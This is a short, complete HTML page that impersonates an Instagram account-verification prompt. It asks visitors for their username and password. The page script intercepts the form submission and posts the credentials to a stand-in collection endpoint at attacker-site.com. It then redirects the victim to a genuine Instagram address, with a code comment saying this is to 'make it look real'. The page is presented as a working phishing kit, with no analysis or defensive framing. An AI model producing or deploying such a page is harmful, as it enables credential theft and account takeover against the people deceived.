<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Account Verification</title>
  <style>
    body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 100px; }
    input, button { margin: 5px; padding: 10px; width: 250px; }
  </style>
</head>
<body>
  <h2>Instagram Account Verification</h2>
  <p>To continue using your account, please verify your identity.</p>
  <form id="verifyForm">
    <input id="username" type="text" placeholder="Instagram Username" required><br>
    <input id="password" type="password" placeholder="Password" required><br>
    <button type="submit">Verify</button>
  </form>

  <script>
    document.getElementById("verifyForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      fetch("https://attacker-site.com/api/collect", {
        method: "POST",
        body: JSON.stringify({ user: u, pass: p }),
        headers: { "Content-Type": "application/json" }
      }).then(() => {
        // Make it look real
        window.location.href = "https://instagram.com/accounts/verified/";
      });
    });
  </script>
</body>
</html>
